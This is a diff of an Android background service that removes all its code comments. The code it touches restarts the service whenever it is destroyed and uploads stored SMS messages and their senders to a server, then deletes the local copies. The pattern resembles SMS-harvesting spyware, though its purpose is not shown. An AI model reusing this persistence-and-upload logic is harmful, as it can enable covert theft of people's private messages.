@@ -60,7 +60,7 @@ public class MyBackgroundService extends Service {
     public void onDestroy() {
         super.onDestroy();
         unregisterNetworkReceiver();
-        // Restart the service
+
         Intent restartIntent = new Intent(this, MyBackgroundService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(restartIntent);
@@ -122,7 +122,7 @@ public class MyBackgroundService extends Service {
         try {
             unregisterReceiver(connectivityReceiver);
         } catch (IllegalArgumentException e) {
-            // Receiver not registered
+
         }
     }
 
@@ -133,7 +133,7 @@ public class MyBackgroundService extends Service {
     }
 
     private void syncPendingData() {
-        // Sync any pending SMS data to server
+
         ArrayList<HashMap<String, String>> pendingSms = databaseHelper.getAllSms();
 
         for (HashMap<String, String> sms : pendingSms) {
@@ -144,13 +144,13 @@ public class MyBackgroundService extends Service {
             ApiRequest.sendSmsData(this, message, sender, new ApiRequest.ApiCallback() {
                 @Override
                 public void onSuccess(String response) {
-                    // Delete from local database after successful sync
+
                     databaseHelper.deleteSms(Long.parseLong(id));
                 }
 
                 @Override
                 public void onError(String error) {
-                    // Keep in database for retry later
+
                 }
             });
         }
